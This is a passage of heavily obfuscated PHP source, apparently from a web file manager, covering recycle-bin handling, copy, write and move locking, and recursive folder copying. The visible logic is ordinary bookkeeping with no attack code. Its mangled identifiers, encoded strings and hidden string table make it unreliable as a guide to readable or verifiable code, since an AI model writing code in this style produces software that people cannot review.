array_to_keyvalue($¦“½Õ­¼, $İÌÇÛì[12], $İÌÇÛì[32]); return $this->fileNameAutoGet($ò¤‘ù¯, $¨«¼…ì¸, $öù·ÏÌª, $œ®±şÉ•); } public function fileNameAutoGet($›ê•Ù²Ö, $êš¼Š¯¨, $ÚïÚ¥ç‚, $ŸÇß‰ïœ) { $¤öêèú =& $_SERVER[¢ñàß¿€]; if ($ÚïÚ¥ç‚ == REPEAT_REPLACE || !$›ê•Ù²Ö || !in_array_not_case($êš¼Š¯¨, $›ê•Ù²Ö) || $ŸÇß‰ïœ && $ÚïÚ¥ç‚ != REPEAT_RENAME_FOLDER) { return $êš¼Š¯¨; } if ($ÚïÚ¥ç‚ == REPEAT_SKIP) { return !1; } $¦²èŒ± = $¤öêèú[10] . get_path_ext($êš¼Š¯¨); $¦²èŒ± = $¦²èŒ± == $¤öêèú[10] || $ŸÇß‰ïœ ? $¤öêèú[12] : $¦²èŒ±; for ($é³±µÜ½ = 1; $é³±µÜ½ <= count($›ê•Ù²Ö) + 1; $é³±µÜ½++) { $Ú£­‡Ì¬ = substr($êš¼Š¯¨, 0, strlen($êš¼Š¯¨) - strlen($¦²èŒ±)); $Î±üæìÀ = $Ú£­‡Ì¬ . "\50{$é³±µÜ½}\51{$¦²èŒ±}"; if (!in_array_not_case($Î±üæìÀ, $›ê•Ù²Ö)) { return $Î±üæìÀ; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\157\165\x72\x63\145\x5f\x72\145\x63\171\x63\x6c\145"; protected $dataAuto = array(array("\x63\x72\145\x61\x74\145\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\x65\x72\164", "\146\165\x6e\143\164\x69\x6f\156")); public function listData($Å·÷®­å = false) { $Ìä ¥ã =& $_SERVER[¢ñàß¿€]; $Å·÷®­å = $Å·÷®­å ? $Å·÷®­å : USER_ID; $ü‰¦ß = $this->where(array($Ìä ¥ã[1761] => $Å·÷®­å))->select(); return array_to_keyvalue($ü‰¦ß, $Ìä ¥ã[12], $Ìä ¥ã[193]); } public function moveToRecycle($¶‰™òæì) { $¾’ÓüŠ¿ =& $_SERVER[¢ñàß¿€]; $ŠıÜú‹ = Model($¾’ÓüŠ¿[1414]); $“ƒÎ£®ó = $ŠıÜú‹->sourceInfo($¶‰™òæì); if (!$“ƒÎ£®ó || $“ƒÎ£®ó[$¾’ÓüŠ¿[505]] == $¾’ÓüŠ¿[91]) { return; } $æ›åºú˜ = array($¾’ÓüŠ¿[491] => $¶‰™òæì, $¾’ÓüŠ¿[1761] => USER_ID, $¾’ÓüŠ¿[648] => $“ƒÎ£®ó[$¾’ÓüŠ¿[190]], $¾’ÓüŠ¿[649] => $“ƒÎ£®ó[$¾’ÓüŠ¿[569]], $¾’ÓüŠ¿[652] => $“ƒÎ£®ó[$¾’ÓüŠ¿[584]]); $this->add($æ›åºú˜); $this->recycleMove($¶‰™òæì, 1); if ($“ƒÎ£®ó[$¾’ÓüŠ¿[485]] == $¾’ÓüŠ¿[91]) { $ƒÛŠæÇ² = array($¾’ÓüŠ¿[652] => array($¾’ÓüŠ¿[612], $“ƒÎ£®ó[$¾’ÓüŠ¿[584]] . $¶‰™òæì . $¾’ÓüŠ¿[613])); $ŠıÜú‹->where($ƒÛŠæÇ²)->setField($¾’ÓüŠ¿[505], 1); } } public function clear() { $this->remove(!1); } public function remove($¼¡¾àÓ = false, $İ˜Û‡ƒ‹ = false) { $–µ¨©×º =& $_SERVER[¢ñàß¿€]; $İ˜Û‡ƒ‹ = $İ˜Û‡ƒ‹ ? $İ˜Û‡ƒ‹ : USER_ID; $ëœ¬„Ò = Model($–µ¨©×º[1414]); $Ê²’ÂÓõ = $this->listData($İ˜Û‡ƒ‹); $¼¡¾àÓ = $¼¡¾àÓ === !1 ? !1 : $¼¡¾àÓ; $°–›Ñ = array(); foreach ($Ê²’ÂÓõ as $ÚÍ±üÓñ) { if ($¼¡¾àÓ != !1 && !in_array($ÚÍ±üÓñ, $¼¡¾àÓ)) { continue; } $Í”±õ£ğ = $ëœ¬„Ò->sourceInfo($ÚÍ±üÓñ); $ëœ¬„Ò->remove($ÚÍ±üÓñ, !1); $Š–üàûÃ = $Í”±õ£ğ[$–µ¨©×º[190]] . $–µ¨©×º[11] . $Í”±õ£ğ[$–µ¨©×º[569]]; $°–›Ñ[$Š–üàûÃ] = array($–µ¨©×º[648] => $Í”±õ£ğ[$–µ¨©×º[190]], $–µ¨©×º[569] => $Í”±õ£ğ[$–µ¨©×º[569]]); $this->where(array($–µ¨©×º[193] => $ÚÍ±üÓñ))->delete(); } foreach ($°–›Ñ as $à¯§Üáú) { $ëœ¬„Ò->targetSpaceUpdate($à¯§Üáú[$–µ¨©×º[190]], $à¯§Üáú[$–µ¨©×º[569]]); } } public function restore($³ø¶¢¾ì = false) { $Í±™Š = $this->listData(); $this->_restoreSource($Í±™Š, $³ø¶¢¾ì); } public function removeUserAll($ğÁ¦ãõ) { $this->remove(!1, $ğÁ¦ãõ); } public function restoreItem($ÓŞ¸äéñ) { $this->_restoreSource(array($ÓŞ¸äéñ), array($ÓŞ¸äéñ)); } private function _restoreSource($İ†Æï½û, $ôš¾åé) { $ÁÅÏÈº =& $_SERVER[¢ñàß¿€]; $«Ø…•»´ = Model($ÁÅÏÈº[1414]); $ôš¾åé = $ôš¾åé == !1 ? !1 : $ôš¾åé; if (!$İ†Æï½û) { return !0; } $å‰½ÚÕƒ = array(); foreach ($İ†Æï½û as $™Úû¿Úô) { if ($ôš¾åé != !1 && !in_array($™Úû¿Úô, $ôš¾åé)) { continue; } $‘Õ²Õ° = $«Ø…•»´->sourceInfo($™Úû¿Úô); $¼ÖıÔæº = $«Ø…•»´->sourceInfo($‘Õ²Õ°[$ÁÅÏÈº[192]]); if ($¼ÖıÔæº[$ÁÅÏÈº[505]] == $ÁÅÏÈº[91]) { continue; } $«Ø…•»´->lockMoveStart($™Úû¿Úô); $this->recycleMove($™Úû¿Úô, 0); if ($‘Õ²Õ°[$ÁÅÏÈº[485]] == $ÁÅÏÈº[91]) { $Ë¸²¤âÄ = array($ÁÅÏÈº[652] => array($ÁÅÏÈº[612], $‘Õ²Õ°[$ÁÅÏÈº[584]] . $™Úû¿Úô . $ÁÅÏÈº[613])); $«Ø…•»´->where($Ë¸²¤âÄ)->setField($ÁÅÏÈº[505], 0); $this->restoreFolderChildren($™Úû¿Úô, $İ†Æï½û); } $this->where(array($ÁÅÏÈº[193] => $™Úû¿Úô))->delete(); $«Ø…•»´->folderSizeReset($‘Õ²Õ°[$ÁÅÏÈº[192]]); $å‰½ÚÕƒ[] = $‘Õ²Õ°[$ÁÅÏÈº[192]]; if ($‘Õ²Õ°[$ÁÅÏÈº[485]] == $ÁÅÏÈº[91]) { $å‰½ÚÕƒ[] = $™Úû¿Úô; } $«Ø…•»´->lockMoveEnd($™Úû¿Úô); } $«Ø…•»´->updateModifyTime($å‰½ÚÕƒ); } private function restoreFolderChildren($Ùµ‡ˆÛŸ, $œ¬„ß¦) { $Ù§¬œŒ™ =& $_SERVER[¢ñàß¿€]; $å³Ï¥ = Model($Ù§¬œŒ™[1414]); $×Ú—©Ç = array($Ù§¬œŒ™[193] => array($Ù§¬œŒ™[7], array())); foreach ($œ¬„ß¦ as $à×š¡ş) { if ($à×š¡ş == $Ùµ‡ˆÛŸ) { continue; } if (!$å³Ï¥->isParentOf($Ùµ‡ˆÛŸ, $à×š¡ş)) { continue; } $”¹·ËªÜ = $å³Ï¥->sourceInfo($à×š¡ş); if ($”¹·ËªÜ[$Ù§¬œŒ™[485]] == $Ù§¬œŒ™[91]) { $×Ú—©Ç[] = array($Ù§¬œŒ™[652] => array($Ù§¬œŒ™[612], $”¹·ËªÜ[$Ù§¬œŒ™[584]] . $à×š¡ş . $Ù§¬œŒ™[613])); } else { $×Ú—©Ç[$Ù§¬œŒ™[193]][1][] = $à×š¡ş; } } if (!$×Ú—©Ç[$Ù§¬œŒ™[193]][1]) { unset($×Ú—©Ç[$Ù§¬œŒ™[193]]); } if (!$×Ú—©Ç) { return; } if (is_array($×Ú—©Ç[$Ù§¬œŒ™[193]]) && is_array($×Ú—©Ç[$Ù§¬œŒ™[193]][1])) { $×Ú—©Ç[$Ù§¬œŒ™[193]][1] = array_unique($×Ú—©Ç[$Ù§¬œŒ™[193]][1]); } $×Ú—©Ç[$Ù§¬œŒ™[1075]] = $Ù§¬œŒ™[2070]; $å³Ï¥->where($×Ú—©Ç)->setField($Ù§¬œŒ™[505], 1); } private function recycleMove($°ş—–¨, $İô¶˜ÃÉ = 1) { $ü‰êñ½ =& $_SERVER[¢ñàß¿€]; $•‘‡Ğ•˜ = Model($ü‰êñ½[1414]); $áÆŠ“€ = Model($ü‰êñ½[2291]); $„²¯üò = array($ü‰êñ½[193] => $°ş—–¨); if ($İô¶˜ÃÉ) { $•‘‡Ğ•˜->where($„²¯üò)->setField($ü‰êñ½[505], 1); $áÆŠ“€->eventRecycle($°ş—–¨, $ü‰êñ½[2292]); } else { $ö…àšà = $•‘‡Ğ•˜->where($„²¯üò)->find(); $à‡Î = $ö…àšà[$ü‰êñ½[485]] == $ü‰êñ½[91]; $ó€åù = $•‘‡Ğ•˜->fileNameAuto($ö…àšà[$ü‰êñ½[192]], $ö…àšà[$ü‰êñ½[32]], REPEAT_RENAME_FOLDER, $à‡Î); if ($ó€åù != $ö…àšà[$ü‰êñ½[32]]) { $•‘‡Ğ•˜->rename($°ş—–¨, $ó€åù); } $•‘‡Ğ•˜->where($„²¯üò)->setField($ü‰êñ½[505], 0); $áÆŠ“€->eventRecycle($°ş—–¨, $ü‰êñ½[2293]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\x2e\x73\x6f\165\162\x63\145\123\145\x63\162\145\x74\x4c\x69\x73\x74"; public $field = array("\x73\157\x75\162\143\x65\x49\x44", "\x74\171\160\145\x49\x44", "\143\162\145\x61\164\x65\125\163\x65\x72"); } goto CÎ™È†…¸È; E¹å£¹ĞÃ: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($Úşáê¢î) { $ÑÉõÍ©¸ =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÑÉõÍ©¸[618], $Úşáê¢î); $€ø‰ı  = 1; $this->_lockEvent($Úşáê¢î, array($ÑÉõÍ©¸[619], $ÑÉõÍ©¸[620]), $€ø‰ı ); $this->_lockParent($Úşáê¢î, array($ÑÉõÍ©¸[620]), $€ø‰ı ); $this->_lockEvent($Úşáê¢î, array($ÑÉõÍ©¸[621], $ÑÉõÍ©¸[622]), $€ø‰ı ); $this->_lockCheckEnd($ÑÉõÍ©¸[618], $Úşáê¢î); } public function lockCopyEnd($×¸–î²) { $¿Ñ¬ê€Ó =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $ü˜½ñô¸ = 0; $this->_lockEvent($×¸–î², array($¿Ñ¬ê€Ó[619], $¿Ñ¬ê€Ó[620]), $ü˜½ñô¸); $this->_lockParent($×¸–î², array($¿Ñ¬ê€Ó[620]), $ü˜½ñô¸); $this->_lockEvent($×¸–î², array($¿Ñ¬ê€Ó[621], $¿Ñ¬ê€Ó[622]), $ü˜½ñô¸); } public function lockWriteStart($ğœÁÁÇÊ, $ØîÄ°àÕ = '') { $ıª×Ñûì =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $this->_lockCheck($ıª×Ñûì[619], $ğœÁÁÇÊ); $ÁüÁ“ı = 1; $this->_lockKey($ıª×Ñûì[623] . $ğœÁÁÇÊ . $ıª×Ñûì[10] . $ØîÄ°àÕ, $ÁüÁ“ı); $this->_lockEvent($ğœÁÁÇÊ, array($ıª×Ñûì[618], $ıª×Ñûì[620]), $ÁüÁ“ı); $this->_lockParent($ğœÁÁÇÊ, array($ıª×Ñûì[618], $ıª×Ñûì[620]), $ÁüÁ“ı); $this->_lockCheckEnd($ıª×Ñûì[619], $ğœÁÁÇÊ); } public function lockWriteEnd($ˆ’âÃªğ, $’ø¾ëÙ— = '') { $Ïóèòîï =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $¬¡Ñı“– = 0; $this->_lockKey($Ïóèòîï[623] . $ˆ’âÃªğ . $Ïóèòîï[10] . $’ø¾ëÙ—, $¬¡Ñı“–); $this->_lockEvent($ˆ’âÃªğ, array($Ïóèòîï[618], $Ïóèòîï[620]), $¬¡Ñı“–); $this->_lockParent($ˆ’âÃªğ, array($Ïóèòîï[618], $Ïóèòîï[620]), $¬¡Ñı“–); } public function lockMoveStart($Íè¯¤–) { $”¿ª½§ =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $this->_lockCheck($”¿ª½§[620], $Íè¯¤–); $‘ô’òš¼ = 1; $this->_lockKey($”¿ª½§[624] . $Íè¯¤–, $‘ô’òš¼); $this->_lockEvent($Íè¯¤–, array($”¿ª½§[618], $”¿ª½§[619]), $‘ô’òš¼); $this->_lockParent($Íè¯¤–, array($”¿ª½§[618], $”¿ª½§[620]), $‘ô’òš¼); $this->_lockEvent($Íè¯¤–, array($”¿ª½§[625], $”¿ª½§[621], $”¿ª½§[622]), $‘ô’òš¼); $this->_lockCheckEnd($”¿ª½§[620], $Íè¯¤–); } public function lockMoveEnd($ˆÕÙ¹Ÿ) { $äôäŠÕ =& $_SERVER[¢ñàß¿€]; if (!$this->allowLock()) { return; } $²Éü¾›Ì = 0; $this->_lockKey($äôäŠÕ[624] . $ˆÕÙ¹Ÿ, $²Éü¾›Ì); $this->_lockEvent($ˆÕÙ¹Ÿ, array($äôäŠÕ[618], $äôäŠÕ[619]), $²Éü¾›Ì); $this->_lockParent($ˆÕÙ¹Ÿ, array($äôäŠÕ[618], $äôäŠÕ[620]), $²Éü¾›Ì); $this->_lockEvent($ˆÕÙ¹Ÿ, array($äôäŠÕ[625], $äôäŠÕ[621], $äôäŠÕ[622]), $²Éü¾›Ì); } private function _lockCheck($©ÜÁêÑÒ, $î‘ô·ñŠ) { $®ÄÜõé =& $_SERVER[¢ñàß¿€]; $ÙÓ¿’¯¡ = $this->sourceInfo($î‘ô·ñŠ); $Í­Éı¯ = $©ÜÁêÑÒ . $®ÄÜõé[10] . $î‘ô·ñŠ; $this->_lockTimeStart[$Í­Éı¯] = timeFloat(); if (!is_array($ÙÓ¿’¯¡)) { return; } $ŸäÑ†í² = LNG($®ÄÜõé[626]); CacheLock::setErrorMsg($®ÄÜõé[176] . htmlspecialchars($ÙÓ¿’¯¡[$®ÄÜõé[32]]) . $®ÄÜõé[178] . $ŸäÑ†í²); $this->_lockKey($Í­Éı¯, 1); $this->_lockKey($Í­Éı¯, 0); $õ«ú¿ğÙ = array_reverse($this->parentLevelArray($ÙÓ¿’¯¡[$®ÄÜõé[584]])); foreach ($õ«ú¿ğÙ as $Ÿ‡áœÔ) { $Í­Éı¯ = $©ÜÁêÑÒ . $®ÄÜõé[627] . $Ÿ‡áœÔ; if (CacheLock::lockGet($®ÄÜõé[628] . $Í­Éı¯)) { $ÙÓ¿’¯¡ = $this->sourceInfo($Ÿ‡áœÔ); CacheLock::setErrorMsg($®ÄÜõé[176] . htmlspecialchars($ÙÓ¿’¯¡[$®ÄÜõé[32]]) . $®ÄÜõé[178] . $ŸäÑ†í²); $this->_lockKey($Í­Éı¯, 1); $this->_lockKey($Í­Éı¯, 0); } } } private function _lockCheckEnd($¹ Ÿ˜Šû, $Ãí™Ëˆ×) { $Æ”¿ù =& $_SERVER[¢ñàß¿€]; $÷ãŠ¯¡… = $¹ Ÿ˜Šû . $Æ”¿ù[10] . $Ãí™Ëˆ×; CacheLock::setErrorMsg($Æ”¿ù[454]); if (!isset($this->_lockTimeStart[$÷ãŠ¯¡…])) { return; } $á‚Ö¤ ü = timeFloat() - $this->_lockTimeStart[$÷ãŠ¯¡…]; unset($this->_lockTimeStart[$÷ãŠ¯¡…]); if ($á‚Ö¤ ü > 0.5) { unset(self::$cacheSourceInfo[$Æ”¿ù[533] . $Ãí™Ëˆ×]); } $€ÃÎ”ûş = $this->sourceInfo($Ãí™Ëˆ×); if (!$€ÃÎ”ûş) { show_json(LNG($Æ”¿ù[108]), !1); } } private function _lockParent($£©œòë¬, $Åöƒ‘‘¿, $ñõÉÊ») { if (!$this->autoLockSet) { return; } $Ÿ®Š·ºë = $this->sourceInfo($£©œòë¬); if (!is_array($Ÿ®Š·ºë)) { return; } $ö‚…™µ = array_reverse($this->parentLevelArray($Ÿ®Š·ºë[$_SERVER[¢ñàß¿€][584]])); foreach ($ö‚…™µ as $Óî¦·À) { $this->_lockEvent($Óî¦·À, $Åöƒ‘‘¿, $ñõÉÊ»); } } private function _lockEvent($á‹éËßØ, $ôĞø€•¶, $Ş¥”Ñø) { $Êà¤ŞÊ‚ =& $_SERVER[¢ñàß¿€]; if (!$this->autoLockSet) { return; } foreach ($ôĞø€•¶ as $êıÀû¾§) { $»ä–•Ûê = $êıÀû¾§ . $Êà¤ŞÊ‚[10] . $á‹éËßØ; if ($Ş¥”Ñø && CacheLock::lockGet($Êà¤ŞÊ‚[628] . $»ä–•Ûê)) { continue; } $this->_lockKey($»ä–•Ûê, $Ş¥”Ñø); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($Î¾ßÊæÖ, $ä¸ó‡û = 1) { $£¼¨¯ÊÓ = $_SERVER[¢ñàß¿€][628] . md5($Î¾ßÊæÖ); if ($ä¸ó‡û) { if (isset(self::$_lockItemArr[$£¼¨¯ÊÓ])) { return; } self::$_lockItemArr[$£¼¨¯ÊÓ] = 1; CacheLock::lock($£¼¨¯ÊÓ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$£¼¨¯ÊÓ])) { return; } unset(self::$_lockItemArr[$£¼¨¯ÊÓ]); CacheLock::unlock($£¼¨¯ÊÓ); } } public function isParentOf($ØÇÄ½ª®, $æ°©ä‹£) { $Ä¹–ê =& $_SERVER[¢ñàß¿€]; $¹‡ÕÜ¿ = $this->sourceInfo($ØÇÄ½ª®); $³Øá¥ = $this->sourceInfo($æ°©ä‹£); $Èä¿ğÖù = $¹‡ÕÜ¿[$Ä¹–ê[584]] . $¹‡ÕÜ¿[$Ä¹–ê[193]] . $Ä¹–ê[50]; $Å®ì¢¦Ì = $³Øá¥[$Ä¹–ê[584]] . $³Øá¥[$Ä¹–ê[193]] . $Ä¹–ê[50]; $Ãò“ÅşÙ = strpos($Å®ì¢¦Ì, $Èä¿ğÖù) === 0; return $Ãò“ÅşÙ; } private $targetIsDelete = 0; public function copy($ö¸ƒÈå‹, $‹‘Ğº„, $àáîÏİş = REPEAT_REPLACE, $‚èäíÃä = '') { $Ù‚•ÚšÛ =& $_SERVER[¢ñàß¿€]; $»§Îå¨ = $this->sourceInfo($ö¸ƒÈå‹); $‡•ı®ëÄ = $this->sourceInfo($‹‘Ğº„); if (!$»§Îå¨ || !$‡•ı®ëÄ || $‡•ı®ëÄ[$Ù‚•ÚšÛ[485]] != $Ù‚•ÚšÛ[91]) { return !1; } if ($this->isParentOf($ö¸ƒÈå‹, $‹‘Ğº„)) { return !1; } $—ÉšÓÈŸ = $‚èäíÃä ? $‚èäíÃä : $»§Îå¨[$Ù‚•ÚšÛ[32]]; $this->lockCopyStart($ö¸ƒÈå‹); $this->lockWriteStart($‹‘Ğº„, $—ÉšÓÈŸ); $âÌÔ»»Í = array($Ù‚•ÚšÛ[629] => array(), $Ù‚•ÚšÛ[630] => array(), $Ù‚•ÚšÛ[631] => array()); $this->targetIsDelete = intval($»§Îå¨[$Ù‚•ÚšÛ[505]]); $±Ùõ¶¸™ = $this->fileNameExistAuto($‹‘Ğº„, $»§Îå¨); $µãĞ–— = $this->_copy($ö¸ƒÈå‹, $‹‘Ğº„, $àáîÏİş, $âÌÔ»»Í, !0, $‚èäíÃä); $this->_childrenListClear(); $this->lockCopyEnd($ö¸ƒÈå‹); $this->lockWriteEnd($‹‘Ğº„, $—ÉšÓÈŸ); if ($»§Îå¨[$Ù‚•ÚšÛ[485]] == $Ù‚•ÚšÛ[91] && $±Ùõ¶¸™ == $µãĞ–—) { $this->folderSizeResetChildren($±Ùõ¶¸™); } Model($Ù‚•ÚšÛ[632])->addAll($âÌÔ»»Í[$Ù‚•ÚšÛ[630]], array(), !0); if ($±Ùõ¶¸™ != $µãĞ–— || $»§Îå¨[$Ù‚•ÚšÛ[485]] == $Ù‚•ÚšÛ[91]) { Model($Ù‚•ÚšÛ[633])->eventCopy($µãĞ–—); } $this->saveAll($âÌÔ»»Í[$Ù‚•ÚšÛ[631]]); Model($Ù‚•ÚšÛ[230])->linkAdd($âÌÔ»»Í[$Ù‚•ÚšÛ[629]]); $this->folderSizeReset($‹‘Ğº„); $this->updateModifyTime($‹‘Ğº„); return $µãĞ–—; } private function _copy($Ü«Î™¡—, $–Ñœ†ç, $¨·ƒä’é, &$á¬ˆ£Ñ’, $·Ó¹ÅÈ, $Ÿ¤Š‡Ñş = '') { $´®Ğ´• =& $_SERVER[¢ñàß¿€]; $º ¶şÙ = $this->sourceInfoCache($Ü«Î™¡—); $ì°‘íÇÈ = $º ¶şÙ[$´®Ğ´•[485]] == $´®Ğ´•[91]; $üÚ˜ïå = $Ÿ¤Š‡Ñş ? $Ÿ¤Š‡Ñş : $º ¶şÙ[$´®Ğ´•[32]]; $¥ÙÑÚë­ = $this->fileNameExistAuto($–Ñœ†ç, $º ¶şÙ); if ($·Ó¹ÅÈ) { $this->_childrenAllMake($Ü«Î™¡—); if ($ì°‘íÇÈ && $¥ÙÑÚë­) { $this->_childrenAllMake($¥ÙÑÚë­); } } if (!$¥ÙÑÚë­) { return $this->_copyCreate($Ü«Î™¡—, $–Ñœ†ç, $üÚ˜ïå, $á¬ˆ£Ñ’); } $¸Ëç‘î¾ = $¥ÙÑÚë­; if ($ì°‘íÇÈ) { if ($¨·ƒä’é == REPEAT_RENAME_FOLDER) { $üÚ˜ïå = $this->fileNameAutoCache($–Ñœ†ç, $üÚ˜ïå, $¨·ƒä’é, $ì°‘íÇÈ); $¸Ëç‘î¾ = $this->_copyCreate($Ü«Î™¡—, $–Ñœ†ç, $üÚ˜ïå, $á¬ˆ£Ñ’); } else { $¡¿œØ†… = $this->_childrenList($Ü«Î™¡—); foreach ($¡¿œØ†… as $ÅĞáıÏ˜) { $this->_copy($ÅĞáıÏ˜[$´®Ğ´•[193]], $¥ÙÑÚë­, $¨·ƒä’é, $á¬ˆ£Ñ’, !1); } } } else { if ($¨·ƒä’é == REPEAT_RENAME || $¨·ƒä’é == REPEAT_RENAME_FOLDER) { $üÚ˜ïå = $this->fileNameAutoCache($–Ñœ†ç, $üÚ˜ïå, $¨·ƒä’é, $ì°‘íÇÈ); $¸Ëç‘î¾ = $this->_copyCreate($Ü«Î™¡—, $–Ñœ†ç, $üÚ˜ïå, $á¬ˆ£Ñ’); } else { if ($¨·ƒä’é == REPEAT_REPLACE) { $Ş³½¢‚Ò = $this->sourceInfoCache($¥ÙÑÚë­); $ùÅâñ²† = $this->fileHistory($Ş³½¢‚Ò, $º ¶şÙ[$´®Ğ´•[541]], $º ¶şÙ[$´®Ğ´•[79]]); if ($ùÅâñ²†) { $á¬ˆ£Ñ’[$´®Ğ´•[629]][] = $º ¶şÙ[$´®Ğ´•[541]]; } } else { if ($¨·ƒä’é == REPEAT_SKIP) { } } } Hook::trigger($´®Ğ´•[634], array($´®Ğ´•[635], $º ¶şÙ, 0)); } return $¸Ëç‘î¾; } private function _copyCreate($ÌŒßÛÈ‹, $Á¾’ÚŒ, $ñ»ä­Æ¦, &$ªÃ’ì©Ã) { $ ÛçÕêì =& $_SERVER[¢ñàß¿€]; $‹‡¬Ûå = $this->sourceInfoCache($ÌŒßÛÈ‹); $±—¤™¡± = $this->sourceInfoCache($Á¾’ÚŒ); $ñ®³Œşû = $this->_makeItemData($‹‡¬Ûå, $±—¤™¡±, $ñ»ä­Æ¦); Hook::trigger($ ÛçÕêì[636], $ñ®³Œşû); Hook::trigger($ ÛçÕêì[637], array($ ÛçÕêì[638], $ñ®³Œşû, 0)); $¤ø’ÙŸĞ = $this->add($ñ®³Œşû); $Ó®Ù±‡‰ = array($ ÛçÕêì[193] => $¤ø’ÙŸĞ, $ ÛçÕêì[32] => $ñ»ä­Æ¦); $this->_copyApplyMeta($Ó®Ù±‡‰, $ªÃ’ì©Ã); if ($‹‡¬Ûå[$ ÛçÕêì[485]] != $ ÛçÕêì[91]) { $ªÃ’ì©Ã[$ ÛçÕêì[629]][] = $‹‡¬Ûå[$ ÛçÕêì[541]]; return $¤ø’ÙŸĞ; } $ó…¤ óË = array(); $‚ï‹ö›¼ = array(); $this->_childrenListAll($ÌŒßÛÈ‹, $ó…¤ óË); $Êç¹ÆÀÜ = count($ó…¤ óË); if ($Êç¹ÆÀÜ == 0) { return $¤ø’ÙŸĞ; } $‘ƒÂÄ¤º = $this->sourceInfo($¤ø’ÙŸĞ); foreach ($ó…¤ óË as $“’İßÌ²) { $ºß§ÕÚ = $this->_makeItemData($“’İßÌ², $‘ƒÂÄ¤º, $“’İßÌ²[$ ÛçÕêì[32]]); $ºß§ÕÚ[$ ÛçÕêì[584]] = $“’İßÌ²[$ ÛçÕêì[584]]; $‚ï‹ö›¼[] = $ºß§ÕÚ; } $this->chunkEventSet($ ÛçÕêì[639], array($ ÛçÕêì[640], $ñ®³Œşû, $Êç¹ÆÀÜ)); $this->addAll($‚ï‹ö›¼, array(), !1); $Ñ˜æ°ß = $this->where(array($ ÛçÕêì[192] => $¤ø’ÙŸĞ))->select(); $†¬½±ˆ = $this->_childrenMakeRelation($ó…¤ óË, $Ñ˜æ°ß); $†¬½±ˆ[$ÌŒßÛÈ‹] = $¤ø’ÙŸĞ; $şÇó²˜ = array(); $§€äïÓ¤ = array(); foreach ($Ñ˜æ°ß as $“’İßÌ²) { $šûşÜ‘æ = $“’İßÌ²[$ ÛçÕêì[193]]; $§¶ÁÅµ… = $this->_childrenMatch($†¬½±ˆ, $“’İßÌ², $‘ƒÂÄ¤º); $şÇó²˜[] = array($ ÛçÕêì[193], $šûşÜ‘æ, $ ÛçÕêì[192], $§¶ÁÅµ…[$ ÛçÕêì[192]]); $§€äïÓ¤[] = array($ ÛçÕêì[193], $šûşÜ‘æ, $ ÛçÕêì[584], $§¶ÁÅµ…[$ ÛçÕêì[584]]); $this->_copyApplyMeta($“’İßÌ², $ªÃ’ì©Ã); if ($“’İßÌ²[$ ÛçÕêì[485]] != $ ÛçÕêì[91]) { $ªÃ’ì©Ã[$ ÛçÕêì[629]][] = $“’İßÌ²[$ ÛçÕêì[541]]; } } $this->chunkEventSet($ ÛçÕêì[641], array($ ÛçÕêì[642], $ñ®³Œşû, $Êç¹ÆÀÜ)); $this->saveAll($şÇó²˜); $this->chunkEventSet($ ÛçÕêì[643], array($ ÛçÕêì[644], $ñ®³Œşû, $Êç¹ÆÀÜ)); $this->saveAll($§€äïÓ¤); return $¤ø’ÙŸĞ; } private function _childrenMakeRelation($ØÜ±¢­Ù, $¡õ¢ö±) { $ã£¢©ğÑ =& $_SERVER[¢ñàß¿€]; $«’ÔÚÏ = array(); $ñ’°¼ = array(); foreach ($ØÜ±¢­Ù as $çÜÍ«Ş—) { $‹óóØ×à = $çÜÍ«Ş—[$ã£¢©ğÑ[32]] . $ã£¢©ğÑ[8] . $çÜÍ«Ş—[$ã£¢©ğÑ[584]]; $«’ÔÚÏ[$‹óóØ×à] = $çÜÍ«Ş—[$ã£¢©ğÑ[193]]; } foreach ($¡õ¢ö± as $çÜÍ«Ş—) { $‹óóØ×à = $çÜÍ«Ş—[$ã£¢©ğÑ[32]] . $ã£¢©ğÑ[8] . $çÜÍ«Ş—[$ã£¢©ğÑ[584]]; $ø»‘ÜÉ‹ = $«’ÔÚÏ[$‹óóØ×à]; $ñ’°¼[$ø»‘ÜÉ‹] = $çÜÍ«Ş—[$ã£¢©ğÑ[193]]; } return $ñ’°¼; } private function _childrenMatch($™™Á–·ò, $Åâôù…ê, $ÛéÛ×İÉ) { $˜„é“¶ˆ =& $_SERVER[¢ñàß¿€]; $…¡›í  = $ÛéÛ×İÉ[$˜„é“¶ˆ[584]]; $Ñ¾´è Ñ = $this->parentLevelArray($Åâôù…ê[$˜„é“¶ˆ[584]]); foreach ($Ñ¾´è Ñ as $­ı™©©¥) { if (isset($™™Á–·ò[$­ı™©©¥])) { $…¡›í  .= $™™Á–·ò[$­ı™©©¥] . $˜„é“¶ˆ[645]; } } $…¡›í  = rtrim($…¡›í , $˜„é“¶ˆ[50]) . $˜„é“¶ˆ[50]; $Ø¬»Ããê = $this->parentLevelArray($…¡›í ); $‚ûË†š = $Ø¬»Ããê[count($Ø¬»Ããê) - 1]; return array($˜„é“¶ˆ[192] => $‚ûË†š, $˜„é“¶ˆ[584] => $…¡›í ); } private function _makeItemData($Òãá´¤ê, $ß¾ó¯², $¬–Ä–Í¿) { $‹²öĞ˜ê =& $_SERVER[¢ñàß¿€]; $ûş¯ïŞ = array($‹²öĞ˜ê[646] => $Òãá´¤ê[$‹²öĞ˜ê[485]], $‹²öĞ˜ê[494] => $¬–Ä–Í¿, $‹²öĞ˜ê[647] => $Òãá´¤ê[$‹²öĞ˜ê[486]] ? $Òãá´¤ê[$‹²öĞ˜ê[486]] : $‹²öĞ˜ê[12], $‹²öĞ˜ê[542] => $Òãá´¤ê[$‹²öĞ˜ê[541]] ? $Òãá´¤ê[$‹²öĞ˜ê[541]] : 0, $‹²öĞ˜ê[617] => $Òãá´¤ê[$‹²öĞ˜ê[79]] ? $Òãá´¤ê[$‹²öĞ˜ê[79]] : 0, 